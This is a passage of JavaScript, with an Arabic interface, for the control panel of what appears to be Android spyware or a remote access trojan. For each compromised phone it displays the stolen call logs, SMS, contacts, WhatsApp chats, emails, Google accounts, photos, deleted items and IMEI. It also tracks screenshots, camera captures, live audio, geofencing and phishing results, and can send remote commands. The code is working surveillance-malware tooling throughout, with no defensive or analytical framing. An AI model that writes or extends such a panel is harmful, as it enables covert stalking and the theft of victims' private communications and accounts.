        if (!select) return;
        const currentValue = currentDevice;
        select.innerHTML = '<option value="">اختر الجهاز...</option>';
        (devices || []).forEach(device => {
            const option = document.createElement('option');
            option.value = device.id;
            option.textContent = device.name || device.id;
            select.appendChild(option);
        });
        if (currentValue) { select.value = currentValue; }
        else if (devices && devices.length > 0) { selectDevice(devices[0].id); select.value = devices[0].id; }
    } catch (e) { console.error('loadDevices:', e); }
}

function selectDevice(deviceId) {
    panelOpenTime = Date.now();
    liveFilterEnabled = true;
    setTimeout(() => { liveFilterEnabled = false; }, 5000);

    currentDevice = deviceId;
    const display = document.getElementById('deviceNameDisplay');
    if (deviceId) {
        const select = document.getElementById('deviceSelect');
        const selectedOption = select.options[select.selectedIndex];
        const deviceName = selectedOption ? selectedOption.textContent : deviceId;
        display.textContent = `📱 ${deviceName}`;
        display.className = 'device-name-display active';
    } else {
        display.textContent = 'لا يوجد جهاز';
        display.className = 'device-name-display';
    }
    if (deviceId && !soundPlayedForDevice) {
        playNotificationSound();
        soundPlayedForDevice = true;
        setTimeout(() => { soundPlayedForDevice = false; }, 10000);
    }
    if (updateInterval) clearInterval(updateInterval);
    if (dataInterval) clearInterval(dataInterval);
    initSSE();
    if (deviceId) {
        updateInterval = setInterval(updateLiveData, 3000);
        dataInterval = setInterval(() => { if (currentDevice) loadAllData(); }, 10000);
        updateLiveData();
        loadAllData();
        loadAudioRecordings();
        loadScreenshots();
        loadCameraPhotos();
        loadVideos();
        loadMotionPhotos();
        loadGeofenceEvents();
        loadLiveAudio();
        loadPhishing();
    }
}

// ═══════════════════════════════════════════
// updateLiveData
// ═══════════════════════════════════════════
async function updateLiveData() {
    if (!currentDevice) return;
    try {
        const response = await authFetch(`/live.php?device=${encodeURIComponent(currentDevice)}`);
        const data = await response.json();
        if (data.error) return;

        const statusEl = document.getElementById('networkStatus');
        if (statusEl) {
            if (data.online) { statusEl.textContent = data.network || 'متصل'; statusEl.className = 'value online'; }
            else { statusEl.textContent = 'غير متصل'; statusEl.className = 'value offline'; }
        }
        const netEl = document.getElementById('networkTypeStatus');
        if (netEl) netEl.textContent = data.network_type || '—';

        const battEl = document.getElementById('batteryStatus');
        if (battEl) battEl.textContent = (data.battery !== null && data.battery !== undefined && data.battery >= 0) ? data.battery + '%' : '—';

        const chargingEl = document.getElementById('chargingStatus');
        if (chargingEl) {
            if (data.charging) {
                const type = data.charging_type && data.charging_type !== 'لا' ? ` (${data.charging_type})` : '';
                chargingEl.textContent = `⚡ يتم الشحن${type}`;
            } else chargingEl.textContent = '';
        }

        const lastSeenEl = document.getElementById('lastSeen');
        if (lastSeenEl) {
            const ago = data.seconds_ago || 0;
            let agoText = '';
            if (ago < 5) agoText = 'الآن';
            else if (ago < 60) agoText = 'قبل ' + ago + ' ثانية';
            else if (ago < 3600) agoText = 'قبل ' + Math.floor(ago / 60) + ' دقيقة';
            else if (ago < 86400) agoText = 'قبل ' + Math.floor(ago / 3600) + ' ساعة';
            else agoText = 'قبل ' + Math.floor(ago / 86400) + ' يوم';
            lastSeenEl.textContent = agoText;
        }

        if (data.call_count !== undefined) { const el = document.getElementById('callCount'); if (el) el.textContent = `(${data.call_count})`; }
        if (data.sms_count !== undefined) { const el = document.getElementById('smsCount'); if (el) el.textContent = `(${data.sms_count})`; }
        if (data.contacts_count !== undefined) { const el = document.getElementById('contactsCount'); if (el) el.textContent = `(${data.contacts_count})`; }
        if (data.images_count !== undefined) { const el = document.getElementById('imagesCount'); if (el) el.textContent = `(${data.images_count})`; }
        if (data.apps_count !== undefined) { const el = document.getElementById('appsCount'); if (el) el.textContent = `(${data.apps_count})`; }
        if (data.deleted_count !== undefined) { const el = document.getElementById('deletedCount'); if (el) el.textContent = `(${data.deleted_count})`; }
        if (data.voice_count !== undefined) { const v = document.getElementById('liveVoicesCount'); if (v && v.textContent === '0') v.textContent = String(data.voice_count); }
        if (data.video_count !== undefined) { const v = document.getElementById('liveVideoCount'); if (v && v.textContent === '0') v.textContent = String(data.video_count); }
        if (data.motion_count !== undefined) { const m = document.getElementById('liveMotionCount'); if (m && m.textContent === '0') m.textContent = String(data.motion_count); }
        if (data.geofence_count !== undefined) { const g = document.getElementById('liveGeofenceCount'); if (g && g.textContent === '0') g.textContent = String(data.geofence_count); }
        if (data.live_audio_count !== undefined) { const l = document.getElementById('liveLiveAudioCount'); if (l && l.textContent === '0') l.textContent = String(data.live_audio_count); }
        if (data.phishing_count !== undefined) { const p = document.getElementById('livePhishingCount'); if (p && p.textContent === '0') p.textContent = String(data.phishing_count); }

        const advCounters = {
            liveAudioCount: data.audio_count || 0,
            liveScreenshotsCount: data.screenshot_count || 0,
            liveCameraCount: data.camera_count || 0,
            liveVideoCount: data.video_count || 0,
            liveMotionCount: data.motion_count || 0,
            liveGeofenceCount: data.geofence_count || 0,
            liveLiveAudioCount: data.live_audio_count || 0,
            livePhishingCount: data.phishing_count || 0
        };
        Object.keys(advCounters).forEach(id => {
            const el = document.getElementById(id);
            if (el) el.textContent = advCounters[id];
        });

        if (data.sim_numbers && data.sim_numbers.length > 0) {
            const display = document.getElementById('deviceNameDisplay');
            if (display && !display.textContent.includes(data.sim_numbers[0])) {
                const baseName = display.textContent.split(' — ')[0];
                display.textContent = `${baseName} — 📱 ${data.sim_numbers[0]}`;
            }
        }
    } catch (e) { console.log('updateLiveData err:', e); }
}

async function loadAllData() {
    if (!currentDevice) return;
    await loadCalls();
    await loadSMS();
    await loadContacts();
    await loadImages();
    await loadApps();
    await loadDeviceInfo();
    await loadDeleted();
    await loadWhatsApp();
    await loadGoogleAccounts();
    await loadEmails();
}

// ═══════════════════════════════════════════
// Loaders
// ═══════════════════════════════════════════
async function loadGoogleAccounts() {
    try {
        const response = await authFetch(`/api.php?action=get_google_accounts&device=${encodeURIComponent(currentDevice)}`);
        const accounts = await response.json();
        const div = document.getElementById('googleAccountsList');
        if (!div) return;
        div.innerHTML = '';
        if (!Array.isArray(accounts) || accounts.length === 0) { div.innerHTML = '<p style="color:#888;">لا توجد حسابات</p>'; return; }
        accounts.forEach(account => {
            const email = account.email || account.name || 'غير معروف';
            const item = document.createElement('div');
            item.className = 'conversation-item';
            item.innerHTML = `<div class="conversation-avatar">📧</div><div class="conversation-info"><div class="conversation-name">${email}</div><div class="conversation-preview">${account.type || 'Google'}</div></div>`;
            div.appendChild(item);
        });
    } catch (e) {}
}

async function loadEmails() {
    try {
        const response = await authFetch(`/api.php?action=get_emails&device=${encodeURIComponent(currentDevice)}`);
        const emails = await response.json();
        const div = document.getElementById('emailsList');
        if (!div) return;
        div.innerHTML = '';
        if (!Array.isArray(emails) || emails.length === 0) { div.innerHTML = '<p style="color:#888;">لا توجد رسائل</p>'; return; }
        [...emails].sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).forEach((email) => {
            const item = document.createElement('div');
            item.className = 'conversation-item';
            const img = email.image_data ? `<img src="data:image/jpeg;base64,${email.image_data}" style="max-width:150px;border-radius:5px;margin-top:8px;cursor:pointer;" onclick="window.open(this.src)">` : '';
            item.innerHTML = `<div class="conversation-avatar">📧</div><div class="conversation-info" style="flex:1;"><div class="conversation-name">${email.app_name || 'Email'}</div><div class="conversation-preview" style="font-weight:bold;color:#00ffcc;">${email.sender || 'غير معروف'}</div><div class="conversation-preview">${email.subject || ''}</div><div class="conversation-preview">${email.snippet || ''}</div><div class="conversation-time" style="color:#888;font-size:11px;">📅 ${formatDate(email.timestamp)}</div>${img}</div>`;
            div.appendChild(item);
        });
    } catch (e) {}
}

async function loadDeleted() {
    try {
        const response = await authFetch(`/api.php?action=get_deleted&device=${encodeURIComponent(currentDevice)}`);
        const deleted = await response.json();
        if (!Array.isArray(deleted)) return;
        if (JSON.stringify(deleted) !== JSON.stringify(allDeleted)) {
            checkNewDeleted(deleted);
            allDeleted = deleted;
            displayDeleted();
        }
    } catch (e) {}
}

async function loadWhatsApp() {
    try {
        const response = await authFetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}&limit=50`);
        let messages = await response.json();
        if (Array.isArray(messages)) messages = messages.slice(-50);
        const div = document.getElementById('whatsappList');
        if (!div) return;
        div.innerHTML = '';
        if (!Array.isArray(messages) || messages.length === 0) { div.innerHTML = '<p style="color:#888;">لا توجد رسائل</p>'; return; }
        const conversations = {};
        messages.forEach(msg => {
            const sender = msg.sender || 'غير معروف';
            if (!conversations[sender]) conversations[sender] = [];
            conversations[sender].push(msg);
        });
        Object.keys(conversations).forEach(sender => {
            const msgs = conversations[sender].sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
            const lastMsg = msgs[msgs.length - 1];
            const displayName = findContactName(sender) || sender;
            const cDiv = document.createElement('div');
            cDiv.className = 'conversation-item';
            cDiv.style.cssText = 'display:flex;align-items:center;gap:15px;padding:15px;background:#111;border-radius:8px;margin-bottom:10px;cursor:pointer;border:1px solid #222;position:relative;';
            cDiv.innerHTML = `
                <div style="font-size:40px;">${lastMsg.is_group ? '👥' : '💬'}</div>
                <div style="flex:1;" onclick="openWhatsAppChat('${sender}')">
                    <div style="color:#00ffcc;font-weight:bold;font-size:16px;">${displayName}</div>
                    <div style="color:#aaa;font-size:13px;">${lastMsg.message_type === 'image' ? '📷 صورة' : lastMsg.message || ''}</div>
                    <div style="color:#888;font-size:12px;">📅 ${formatWhatsAppDate(lastMsg.timestamp)}</div>
                </div>
                <div style="text-align:center;"><div style="background:#00ffcc;color:black;padding:5px 12px;border-radius:15px;font-size:13px;font-weight:bold;">${msgs.length}</div></div>
                <button onclick="event.stopPropagation();deleteWhatsAppChat('${sender}')" style="position:absolute;top:5px;left:5px;background:none;border:none;color:#ff3300;cursor:pointer;font-size:18px;">🗑️</button>`;
            div.appendChild(cDiv);
        });
        const badge = document.getElementById('whatsappCount');
        if (badge) badge.textContent = `(${messages.length})`;
    } catch (e) {}
}

async function openWhatsAppChat(sender) {
    try {
        const response = await authFetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}&limit=200`);
        const messages = await response.json();
        const senderMessages = messages.filter(m => (m.sender || 'غير معروف') === sender)
            .sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
        const chatWindow = document.createElement('div');
        chatWindow.id = 'whatsappChatWindow';
        chatWindow.style.cssText = `position:fixed;top:0;left:0;width:100%;height:100%;background:#0a0a0a;z-index:9999;display:flex;flex-direction:column;`;
        const displayName = findContactName(sender) || sender;
        currentChat = sender;
        chatWindow.innerHTML = `
            <div style="background:#075E54;padding:15px 20px;display:flex;align-items:center;gap:15px;">
                <button onclick="closeWhatsAppChat()" style="background:none;border:none;color:white;font-size:24px;cursor:pointer;">⬅️</button>
                <div style="flex:1;">
                    <div style="color:white;font-weight:bold;font-size:18px;">${displayName}</div>
                    <div style="color:#ccc;font-size:12px;">${sender}</div>
                </div>
                <button onclick="openReplyWhatsApp('${sender.replace(/'/g, "\\'")}')" style="background:none;border:none;color:#25D366;font-size:20px;cursor:pointer;padding:5px 10px;">↩️</button>
                <button onclick="selectAllWhatsApp()" style="background:none;border:none;color:#25D366;font-size:20px;cursor:pointer;padding:5px 10px;">☑️</button>
                <button onclick="deleteSelectedWhatsApp()" style="background:none;border:none;color:#ff3300;font-size:20px;cursor:pointer;padding:5px 10px;">🗑️</button>
            </div>
            <div id="whatsappMessagesContainer" style="flex:1;overflow-y:auto;padding:20px;background:#0a0a0a;">
                ${senderMessages.map((msg) => `
                    <div class="wa-msg" data-timestamp="${msg.timestamp}" style="margin-bottom:12px;">
                        <div style="display:flex;justify-content:flex-start;">
                            <div style="max-width:70%;padding:12px 15px;border-radius:15px;background:#1e2a2a;margin-right:auto;border-bottom-left-radius:5px;">
                                <div style="color:#25D366;font-size:11px;font-weight:bold;margin-bottom:3px;">📥 ${displayName}</div>
                                ${msg.image_data ? `<img src="data:image/jpeg;base64,${msg.image_data}" onclick="window.open(this.src)" style="max-width:250px;border-radius:10px;cursor:pointer;display:block;margin-bottom:5px;">` : ''}
                                <div style="color:white;font-size:15px;">${msg.message_type === 'image' ? '📷' : msg.message_type === 'video' ? '🎬' : msg.message_type === 'audio' ? '🎵' : msg.message_type === 'document' ? '📄' : ''} ${msg.message || ''}</div>
                                <div style="color:#aaa;font-size:11px;text-align:left;margin-top:3px;">${formatWhatsAppDate(msg.timestamp)}</div>
                            </div>
                        </div>
                    </div>`).join('')}
            </div>`;
        document.body.appendChild(chatWindow);
        const container = document.getElementById('whatsappMessagesContainer');
        container.scrollTop = container.scrollHeight;
    } catch (e) {}
}

function closeWhatsAppChat() { const w = document.getElementById('whatsappChatWindow'); if (w) w.remove(); currentChat = null; }
function selectAllWhatsApp() {
    const msgs = document.querySelectorAll('.wa-msg');
    msgs.forEach(msg => {
        if (msg.classList.contains('selected')) { msg.classList.remove('selected'); msg.style.opacity = '1'; }
        else { msg.classList.add('selected'); msg.style.opacity = '0.5'; }
    });
}
async function deleteSelectedWhatsApp() {
    const selected = document.querySelectorAll('.wa-msg.selected');
    if (selected.length === 0) { alert('⚠️'); return; }
    if (!confirm(`حذف ${selected.length}؟`)) return;
    const timestamps = [];
    selected.forEach(msg => { timestamps.push(msg.getAttribute('data-timestamp')); });
    try {
        const response = await authFetch(`/api.php?action=delete_whatsapp&device=${encodeURIComponent(currentDevice)}&timestamps=${encodeURIComponent(timestamps.join(','))}`);
        const result = await response.json();
        if (result.success) {
            const sender = currentChat;
            closeWhatsAppChat();
            loadWhatsApp();
            if (sender) setTimeout(() => openWhatsAppChat(sender), 500);
        }
    } catch (e) {}
}
async function deleteWhatsAppChat(sender) {
    if (!confirm(`حذف كل رسائل ${sender}؟`)) return;
    try {
        const response = await authFetch(`/api.php?action=delete_whatsapp_chat&device=${encodeURIComponent(currentDevice)}&sender=${encodeURIComponent(sender)}`);
        const result = await response.json();
        if (result.success) loadWhatsApp();
    } catch (e) {}
}

async function clearWhatsAppList() {
    if (!currentDevice) return;
    if (!confirm('مسح الكل؟')) return;
    try {
        const response = await authFetch(`/api.php?action=clear_whatsapp&device=${encodeURIComponent(currentDevice)}`);
        const data = await response.json();
        if (data.success) {
            const div = document.getElementById('whatsappList');
            if (div) div.innerHTML = '<p style="color:#888;">تم المسح</p>';
            const badge = document.getElementById('whatsappCount');
            if (badge) badge.textContent = '(0)';
        }
    } catch (e) {}
}

function displayDeleted() {
    const div = document.getElementById('deletedList');
    if (!div) return;
    div.innerHTML = '';
    let filtered = allDeleted || [];
    if (deletedFilter !== 'all') {
        filtered = filtered.filter(item => {
            const t = item.type || item.deleted_type || '';
            if (deletedFilter === 'call_log') return t === 'call_log' || t === 'call_logs' || t === 'deleted_call';
            if (deletedFilter === 'sms') return t === 'sms' || t === 'deleted_sms';
            if (deletedFilter === 'image') return t === 'image';
            return true;
        });
    }
    if (filtered.length === 0) { div.innerHTML = '<p style="color:#888;">لا توجد عناصر</p>'; return; }
    filtered.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
    filtered.forEach((item) => {
        const realIdx = allDeleted.indexOf(item);
        const divItem = document.createElement('div');
        divItem.className = 'conversation-item';
        divItem.style.cssText = 'flex-direction:column;align-items:stretch;position:relative;';
        const type = item.type || item.deleted_type || '';
        const data = item.item || item;
        const ts = item.timestamp || data.deleted_at || data.date || 0;
        let innerHTML = '';
        if (type === 'call_log' || type === 'call_logs' || type === 'deleted_call') {
            innerHTML = `<div style="display:flex;gap:15px;align-items:center;"><div class="conversation-avatar">📞</div><div class="conversation-info" style="flex:1;"><div class="conversation-name">📞 مكالمة محذوفة</div><div class="conversation-preview">الرقم: <b>${data.number || 'غير معروف'}</b></div><div class="conversation-preview">النوع: ${getCallType(data.type)}</div><div class="conversation-preview" style="color:#ff6600;">⏰ ${formatDate(ts)}</div></div></div>`;
        } else if (type === 'sms' || type === 'deleted_sms') {
            innerHTML = `<div style="display:flex;gap:15px;align-items:flex-start;"><div class="conversation-avatar">💬</div><div class="conversation-info" style="flex:1;"><div class="conversation-name">💬 رسالة محذوفة</div><div class="conversation-preview">من/إلى: <b>${data.address || 'غير معروف'}</b></div><div class="conversation-preview">النص: ${data.body || '—'}</div><div class="conversation-preview" style="color:#ff6600;">⏰ ${formatDate(ts)}</div></div></div>`;
        } else if (type === 'contact' || type === 'contacts') {
            innerHTML = `<div style="display:flex;gap:15px;align-items:center;"><div class="conversation-avatar">👤</div><div class="conversation-info" style="flex:1;"><div class="conversation-name">👤 جهة محذوفة</div><div class="conversation-preview">${data.name || 'غير معروف'}</div><div class="conversation-preview" style="color:#ff6600;">⏰ ${formatDate(ts)}</div></div></div>`;
        } else if (type === 'image') {
            innerHTML = `<div style="display:flex;gap:15px;align-items:center;"><div class="conversation-avatar">🖼️</div><div class="conversation-info" style="flex:1;"><div class="conversation-name">🖼️ صورة محذوفة</div><div class="conversation-preview">${data.name || '—'}</div><div class="conversation-preview" style="color:#ff6600;">⏰ ${formatDate(ts)}</div></div></div>`;
        } else {
            innerHTML = `<div style="display:flex;gap:15px;align-items:center;"><div class="conversation-avatar">🗑️</div><div class="conversation-info" style="flex:1;"><div class="conversation-name">🗑️ عنصر محذوف</div><div class="conversation-preview">${type || '—'}</div><div class="conversation-preview" style="color:#ff6600;">⏰ ${formatDate(ts)}</div></div></div>`;
        }
        divItem.innerHTML = innerHTML + `<button onclick="deleteSingleDeleted(${realIdx})" style="position:absolute;top:10px;left:10px;background:#ff3300;color:#fff;border:none;width:28px;height:28px;border-radius:50%;cursor:pointer;font-size:13px;font-weight:bold;">✕</button>`;
        div.appendChild(divItem);
    });
}

async function loadCalls() {
    try {
        const response = await authFetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=call_logs`);
        const newCalls = await response.json();
        if (!Array.isArray(newCalls)) return;
        if (JSON.stringify(newCalls) !== JSON.stringify(allCalls)) {
            checkNewCalls(newCalls);
            allCalls = newCalls;
            if (currentCallNumber) openCallDetail(currentCallNumber);
            else displayCallsList();
        }
    } catch (e) {}
}

function displayCallsList() {
    const cdv = document.getElementById('callDetailView'); if (cdv) cdv.style.display = 'none';
    const clv = document.getElementById('callsListView'); if (clv) clv.style.display = 'block';
    const div = document.getElementById('callsListView');
    if (!div) return;
    div.innerHTML = '';
    if (!allCalls || allCalls.length === 0) { div.innerHTML = '<p style="color:#888;">لا توجد مكالمات</p>'; return; }
    [...allCalls].sort((a, b) => (b.date || 0) - (a.date || 0)).forEach(call => {
        const displayName = call.name || findContactName(call.number) || call.number || 'غير معروف';
        const item = document.createElement('div');
        item.className = 'conversation-item';
        item.onclick = () => openCallDetail(call.number);
        item.innerHTML = `<div class="conversation-avatar">${call.type == 1 ? '📥' : call.type == 2 ? '📤' : '❌'}</div><div class="conversation-info"><div class="conversation-name">${displayName}</div><div class="conversation-preview">${formatDate(call.date)}</div></div><div class="conversation-time">${formatDuration(call.duration)}</div>`;
        div.appendChild(item);
    });
}

function openCallDetail(number) {
    currentCallNumber = number;
    const clv = document.getElementById('callsListView'); if (clv) clv.style.display = 'none';
    const cdv = document.getElementById('callDetailView'); if (cdv) cdv.style.display = 'block';
    const title = document.getElementById('callDetailTitle'); if (title) title.textContent = `📞 ${findContactName(number) || number}`;
    const dd = document.getElementById('callDetailsList');
    if (!dd) return;
    dd.innerHTML = '';
    allCalls.filter(c => c.number === number).sort((a, b) => (b.date || 0) - (a.date || 0)).forEach(call => {
        const div = document.createElement('div');
        div.className = 'call-detail-item';
        div.innerHTML = `<span class="call-type type-${call.type}">${getCallType(call.type)}</span><span>⏱️ ${formatDuration(call.duration)}</span><span>📅 ${formatDate(call.date)}</span>`;
        dd.appendChild(div);
    });
}

function backToCallsList() { currentCallNumber = null; displayCallsList(); }

async function loadSMS() {
    try {
        const response = await authFetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=sms`);
        const newSMS = await response.json();
        if (!Array.isArray(newSMS)) return;
        if (JSON.stringify(newSMS) !== JSON.stringify(allSMS)) {
            checkNewSMS(newSMS);
            allSMS = newSMS;
            if (currentChat) openChat(currentChat);
            else displayConversations();
        }
    } catch (e) {}
}

function displayConversations() {
    const cv = document.getElementById('chatView'); if (cv) cv.style.display = 'none';
    const cl = document.getElementById('conversationsList'); if (cl) cl.style.display = 'block';
    const div = document.getElementById('conversationsList');
    if (!div) return;
    div.innerHTML = '';
    if (!allSMS || allSMS.length === 0) { div.innerHTML = '<p style="color:#888;">لا توجد رسائل</p>'; return; }
    const sorted = [...allSMS].sort((a, b) => (b.date || 0) - (a.date || 0));
    const conversations = {};
    sorted.forEach(sms => { const n = sms.address || 'غير معروف'; if (!conversations[n]) conversations[n] = []; conversations[n].push(sms); });
    Object.keys(conversations).forEach(number => {
        const last = conversations[number][0];
        const displayName = findContactName(number) || number;
        const item = document.createElement('div');
        item.className = 'conversation-item';
        item.onclick = () => openChat(number);
        item.innerHTML = `<div class="conversation-avatar">💬</div><div class="conversation-info"><div class="conversation-name">${displayName}</div><div class="conversation-preview">${last.body || ''}</div></div><div class="conversation-time">${formatDate(last.date)}</div>`;
        div.appendChild(item);
    });
}

function openChat(number) {
    currentChat = number;
    const cl = document.getElementById('conversationsList'); if (cl) cl.style.display = 'none';
    const cv = document.getElementById('chatView'); if (cv) cv.style.display = 'block';
    const t = document.getElementById('chatTitle'); if (t) t.textContent = `💬 ${findContactName(number) || number}`;
    const ml = document.getElementById('messagesList');
    if (!ml) return;
    ml.innerHTML = '';
    allSMS.filter(s => s.address === number).sort((a, b) => (a.date || 0) - (b.date || 0)).forEach(sms => {
        const div = document.createElement('div');
        div.className = `message ${sms.type == 1 ? 'incoming' : 'outgoing'}`;
        div.innerHTML = `<div class="message-bubble"><div class="message-text">${sms.body || ''}</div><div class="message-time">${formatDate(sms.date)}</div></div>`;
        ml.appendChild(div);
    });
    ml.scrollTop = ml.scrollHeight;
}

function backToConversations() { currentChat = null; displayConversations(); }

async function loadContacts() {
    try {
        const response = await authFetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=contacts`);
        const newContacts = await response.json();
        if (!Array.isArray(newContacts)) return;
        if (JSON.stringify(newContacts) !== JSON.stringify(allContacts)) {
            allContacts = newContacts;
            if (currentContact) openContactDetail(currentContact);
            else displayContactsList();
        }
    } catch (e) {}
}

function displayContactsList() {
    const cd = document.getElementById('contactDetailView'); if (cd) cd.style.display = 'none';
    const cl = document.getElementById('contactsListView'); if (cl) cl.style.display = 'block';
    const div = document.getElementById('contactsListView');
    if (!div) return;
    div.innerHTML = '';
    if (!allContacts || allContacts.length === 0) { div.innerHTML = '<p style="color:#888;">لا توجد جهات</p>'; return; }
    [...allContacts].sort((a, b) => (a.name || '').localeCompare(b.name || '', 'ar')).forEach(contact => {
        const numbers = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
        const item = document.createElement('div');
        item.className = 'conversation-item';
        item.onclick = () => openContactDetail(contact.name);
        item.innerHTML = `<div class="conversation-avatar">👤</div><div class="conversation-info"><div class="conversation-name">${contact.name || 'بدون اسم'}</div><div class="conversation-preview">${numbers.join(', ')}</div></div>`;
        div.appendChild(item);
    });
}

function openContactDetail(name) {
    currentContact = name;
    const cl = document.getElementById('contactsListView'); if (cl) cl.style.display = 'none';
    const cd = document.getElementById('contactDetailView'); if (cd) cd.style.display = 'block';
    const contact = allContacts.find(c => c.name === name);
    if (!contact) return;
    const numbers = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
    const det = document.getElementById('contactDetails');
    if (det) det.innerHTML = `<div class="contact-detail-card"><div class="contact-avatar">👤</div><h4>${contact.name}</h4><div class="contact-numbers">${numbers.map(n => `<div class="contact-number-item"><span>${n}</span><div><button class="action-btn" onclick="openChat('${n}')">💬</button><button class="action-btn" onclick="openCallDetail('${n}')">📞</button><button class="action-btn" onclick="openSendSmsTo('${n}')">📨</button></div></div>`).join('')}</div></div>`;
}

function backToContactsList() { currentContact = null; displayContactsList(); }

async function loadImages() {
    try {
        const response = await authFetch(`/api.php?action=get_image_data&device=${encodeURIComponent(currentDevice)}`);
        const images = await response.json();
        const grid = document.getElementById('imagesGrid');
        if (!grid) return;
        grid.innerHTML = '';
        if (!Array.isArray(images) || images.length === 0) { grid.innerHTML = '<p style="color:#888;">لا توجد صور</p>'; return; }
        [...images].sort((a, b) => (b.date || 0) - (a.date || 0)).forEach((image, i) => {
            const div = document.createElement('div');
            div.className = 'image-card';
            const img = document.createElement('img');
            if (image.data) { let m = 'image/jpeg'; if (image.name) { const e = image.name.toLowerCase().split('.').pop(); if (e === 'png') m = 'image/png'; } img.src = `data:${m};base64,${image.data}`; }
            img.className = 'thumb';
            const name = document.createElement('div'); name.className = 'image-name'; name.textContent = image.name || `صورة ${i+1}`;
            const btns = document.createElement('div'); btns.className = 'image-buttons';
            const v = document.createElement('button'); v.className = 'view-btn'; v.textContent = '👁️'; v.onclick = () => window.open(img.src);
            const d = document.createElement('button'); d.className = 'download-btn'; d.textContent = '⬇️'; d.onclick = () => { const a = document.createElement('a'); a.href = img.src; a.download = image.name; document.body.appendChild(a); a.click(); a.remove(); };
            btns.appendChild(v); btns.appendChild(d);
            div.appendChild(img); div.appendChild(name); div.appendChild(btns);
            grid.appendChild(div);
        });
    } catch (e) {}
}

async function loadApps() {
    try {
        const response = await authFetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=installed_apps`);
        const apps = await response.json();
        const tbody = document.querySelector('#appsTable tbody');
        if (!tbody) return;
        tbody.innerHTML = '';
        if (!Array.isArray(apps) || apps.length === 0) return;
        apps.forEach(app => { const r = document.createElement('tr'); r.innerHTML = `<td>${app.name || app.package}</td><td>${app.package}</td><td>${app.system_app ? 'نعم' : 'لا'}</td>`; tbody.appendChild(r); });
    } catch (e) {}
}

async function loadDeviceInfo() {
    try {
        const response = await authFetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=device_info`);
        const info = await response.json();
        const div = document.getElementById('deviceInfo');
        if (!div) return;
        if (!info || Object.keys(info).length === 0) return;
        div.innerHTML = `<div class="device-info-grid"><div class="info-card"><span>الموديل:</span><strong>${info.model || '—'}</strong></div><div class="info-card"><span>العلامة:</span><strong>${info.brand || '—'}</strong></div><div class="info-card"><span>النظام:</span><strong>${info.os_version || '—'}</strong></div><div class="info-card"><span>IMEI:</span><strong>${info.imei || '—'}</strong></div></div>`;
    } catch (e) {}
}

function switchTab(tabName) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
    const tab = document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`);
    if (tab) tab.classList.add('active');
    const pane = document.getElementById(`${tabName}Tab`);
    if (pane) pane.classList.add('active');
    if (tabName === 'security') { loadAuthorizedDevices(); loadDevicePermissions(); }
}

// ═══════════════════════════════════════════
// Voice scan
// ═══════════════════════════════════════════
async function triggerVoiceScan() {
    if (!currentDevice) { alert('⚠️'); return; }
    try {
        const response = await fetch('/api.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ device: currentDevice, command: 'scan_voices', token: getAuthToken() })
        });
        const result = await response.json();
        if (result.success) showNotification('🔁', 'جاري الفحص...', '🎤');
        else alert('❌');
    } catch (e) { alert('❌'); }
}

// ═══════════════════════════════════════════
// Security / auth devices
// ═══════════════════════════════════════════
async function loadAuthorizedDevices() {
    if (!isOwner()) return;
    try {
        const token = getAuthToken();
        if (!token) return;
        const res = await fetch(`/auth/devices?token=${encodeURIComponent(token)}`);
        if (res.status === 401) { logout(); return; }
        if (res.status === 403) return;
        const data = await res.json();
        const pendingDiv = document.getElementById('pendingDevicesList');
        if (pendingDiv) {
            pendingDiv.innerHTML = '';
            if (!data.pending || data.pending.length === 0) pendingDiv.innerHTML = '<p style="color:#666;font-size:13px;">لا توجد أجهزة قيد الانتظار</p>';
            else data.pending.forEach(dev => {
                const div = document.createElement('div');
                div.className = 'conversation-item';
                div.style.cssText = 'flex-direction:column;align-items:stretch;background:#1a1a00;border:1px solid #ffcc00;padding:12px;border-radius:8px;margin-bottom:10px;';
                div.innerHTML = `
                    <div style="color:#ffcc00;font-weight:bold;margin-bottom:5px;">🆕 جهاز جديد</div>
                    <div style="color:#ccc;font-size:12px;word-break:break-all;">FP: ${(dev.fp || '').slice(0, 24)}...</div>
                    <div style="color:#888;font-size:11px;">IP: ${dev.ip || '—'}</div>
                    <div style="display:flex;gap:8px;margin-top:10px;">
                        <button onclick="approveDevice('${dev.fp}')" style="flex:1;background:#00cc66;color:#fff;border:none;padding:8px;border-radius:6px;cursor:pointer;font-weight:bold;">✅</button>
                        <button onclick="denyDevice('${dev.fp}')" style="flex:1;background:#ff3300;color:#fff;border:none;padding:8px;border-radius:6px;cursor:pointer;font-weight:bold;">❌</button>
                    </div>`;
                pendingDiv.appendChild(div);
            });
        }
        const badge = document.getElementById('pendingBadge');
        if (badge) {
            const count = (data.pending || []).length;
            badge.textContent = count > 0 ? `(${count}) 🔴` : '';
            badge.className = count > 0 ? 'count badge-new' : 'count';
        }
        const approvedDiv = document.getElementById('approvedDevicesList');
        if (approvedDiv) {
            approvedDiv.innerHTML = '';
            if (!data.approved || data.approved.length === 0) approvedDiv.innerHTML = '<p style="color:#666;font-size:13px;">لا توجد أجهزة مصرح لها</p>';
            else data.approved.forEach(fp => {
                const div = document.createElement('div');
                div.className = 'conversation-item';
                div.style.cssText = 'background:#001a0d;border:1px solid #00cc66;padding:12px;border-radius:8px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;gap:10px;';
